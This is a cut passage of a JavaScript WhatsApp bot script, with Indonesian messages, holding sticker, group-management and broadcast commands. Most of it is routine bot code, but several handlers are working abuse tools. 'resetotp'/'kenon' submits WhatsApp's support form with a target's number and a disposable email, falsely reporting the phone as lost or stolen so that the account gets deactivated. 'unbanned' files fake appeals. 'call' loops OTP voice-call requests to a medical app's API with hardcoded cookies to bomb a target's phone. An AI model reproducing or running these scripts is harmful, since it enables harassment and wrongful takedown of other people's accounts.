            conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted: blue})
            }
            break
            case 'togif': {
                if (!quoted) return paycall('Reply video')
                if (!/webp/.test(mime)) return paycall(`reply sticker with caption *${prefix + command}*`)
                reply(global.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: blue })
                await fs.unlinkSync(media)
            }
            break
case 'swm': case 'take':
         case 'wm': {
            if (!quoted) return paycall(`Where is the text?`)
            if (quoted.isAnimated) {
               let media = await conn.downloadAndSaveMediaMessage(quoted)
               let webpToMp4 = await webp2mp4File(media)
               let encmedia = await conn.sendVideoAsSticker(m.chat, webpToMp4.result, blue, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await conn.sendImageAsSticker(m.chat, media, blue, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
               if ((quoted.msg || quoted).seconds > 11) return paycall('Maximum 10 Seconds!')
               let media = await quoted.download()
               let encmedia = await conn.sendVideoAsSticker(m.chat, media, blue, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else {
               paycall(`Photo/Video?`)
            }
            }
         break
         case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return paycall(respond)
                if (!text) return paycall(respond)
                reply(global.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await conn.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans}`
                let pop = await conn.sendImageAsSticker(m.chat, smeme, blue, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
            case 'qc': {
                const {
                    quote
                } = require('./lib/quote.js')
                if (!q) return paycall('Enter Text')
                let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
                const rest = await quote(q, pushname, ppnyauser)
                reply(global.wait)
                conn.sendImageAsSticker(m.chat, rest.result, blue, {
                    packname: `${global.packname}`,
                    author: `${global.author}`
                })
            }
            break
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':
case 'attp': {
if (args.length == 0) return paycall(`Example: ${prefix + command} ShinChan Uwu`)
reply(global.wait)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
conn.sendImageAsSticker(m.chat, ini_buffer, blue, {
                    packname: `${global.packname}`,
                    author: `${global.author}`
                })
       }
break
//END STICKER
case 'tes':
case 'ping':
         case 'runtime': {
         const used = process.memoryUsage()
            const cpus = os.cpus().map(cpu => {
               cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
               return cpu
            })
            const cpu = cpus.reduce((last, cpu, _, {
               length
            }) => {
               last.total += cpu.total
               last.speed += cpu.speed / length
               last.times.user += cpu.times.user
               last.times.nice += cpu.times.nice
               last.times.sys += cpu.times.sys
               last.times.idle += cpu.times.idle
               last.times.irq += cpu.times.irq
               return last
            }, {
               speed: 0,
               total: 0,
               times: {
                  user: 0,
                  nice: 0,
                  sys: 0,
                  idle: 0,
                  irq: 0
               }
            })
            let timestamp = speed()
            let latensi = speed() - timestamp
            let neww = performance.now()
            let oldd = performance.now()
            let respon = `⏳Runtime : ${runtime(process.uptime())}\n📌Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
            paytod(respon)
            }
            break
            
//GROUP MENU
case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
let response = await conn.groupInviteCode(from)
conn.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
conn.groupRevokeInvite(from)
break

case 'sendlinkgc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await conn.groupInviteCode(from)
conn.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break

case 'kick': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'remove')
}
break

case 'add': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'demote')
}
break

case 'hidetag': case 'hid':
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
conn.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)
})
break
case 'totag': case 'tg':
                if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
                conn.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break

case 'editgroup': {   
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break

case 'editinfo': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
 if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break

case 'join': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'editsubjek': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text nya ?'
await loading()
await conn.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'editdesk':{
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await loading()
await conn.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'tagall': {
if (!m.isGroup) return
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: blue })
}
break

case'demoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'demote')
break

case 'promoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'promote')
break

case "welcome":
{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break

case 'bcgc': case 'bcgroup': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
conn.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'antilink': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (AntiLinkInstagram) return paycall('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
paycall('Success in turning on instagram antilink in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return paycall('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
paycall('Success in turning off instagram antilink in this group')
} else {
  await paycall(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'antilinkch': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (AntiLinkChannel) return paycall('Already activated')
ntilinkchannel.push(from)
fs.writeFileSync('./database/antilinkchannelwa.json', JSON.stringify(ntilinkchannel))
paycall('Sukses mengaktifkan antilink Channel WhatsApp di grup ini')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link Saluran WhatsApp di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkChannel) return paycall('Already deactivated')
let off = ntilinkchannel.indexOf(from)
ntilinkchannel.splice(off, 1)
fs.writeFileSync('./database/antilinkchannelwa.json', JSON.stringify(ntilinkchannel))
paycall('Sukses mematikan antilink Channel WhatsApp di grup ini')
} else {
  await paycall(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case "antitoxic":
{
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Non Aktif')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break

case 'tourl': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')

if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}

break
case 'toonce':
            case 'nyehh': {
            if (!isCreator) return paycall(global.ownercuy)
                if (!quoted) return paycall(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                    } else if (/audio/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        audio: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "19",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                    } else if (/document/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break

case 'block': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'unblock': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//END GROUP MENU

//========================REPEAT WHATSAPP=========================//
case 'repeat':
if (!isCreator) return paycall(global.ownercuy)
if (!text) return paycall('Masukan Text|jumlah')
reply(global.wait)
var shinchan_kawaii = `${args.join(' ')}`
var kata = shinchan_kawaii.split("|")[0];
var angka = shinchan_kawaii.split("|")[1]
let katanya = `${kata}`.repeat(angka)
await conn.sendMessage(m.chat, { text: `${katanya}` }, { quoted: blue})
break
case 'getcase':
if (!isCreator) return paycall(global.ownercuy)
const getCase = (cases) => {
return "case" + `'${cases}'` + fs.readFileSync("main.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
}
reply(`${getCase(q)}`)
break
case 'q': case 'quoted': {
if (!m.quoted) return paycall('Reply the Message!!')
let shinuwu= await conn.serializeM(await m.getQuotedObj())
if (!shinuwu.quoted) return paycall('Pesan yang Anda balas tidak dikirim oleh bot')
await shinuwu.quoted.copyNForward(m.chat, true)
}
break
//END REPEAT
case 'unbanned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Halo admin WhatsApp, saya mohon buka kembali akun WhatsApp saya +${targetnya} karena saya tidak melakukan spam, saat ini mungkin akun WhatsApp saya sedang di retas oleh orang yang tidak bertanggung jawab dan melakukan pelanggaran. Saya mohon untuk membuka kembali Akun WhatsApp saya agar bisa digunakan kembali karena sangat penting. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp🥰💖`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================//
case 'resetotp': case 'kenon': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19574.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007982238")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Hai,

 Terima kasih atas pesan Anda.

 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda telah di keluarkan maka untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.

 Selama periode penonaktifan:

 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda.
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke

 akun akan tetap dalam status tertunda hingga 30 hari.

 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai

 secepatnya.  Daftar ulang akun Anda dengan memasukkan 6 digit

 kode yang Anda terima melalui SMS atau panggilan telepon.  Jika Anda mendaftar ulang

 pulihkan riwayat obrolan Anda di: Android |  iPhone.

 file, cadangan, atau riwayat panggilan dari akun yang dihapus.

 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media

 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.

 Sumber daya terkait:

 ⚫ Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.

 ⚫ Pelajari tentang akun yang dicuri di artikel ini.

 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================//
case "call":
if (!isCreator) return m.reply('*khusus Premium*')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6282788388737`)
let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+0`)) return paycall('Tidak bisa call ke nomor ini!')
for (let x = 0; x < 10; x++) {
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': 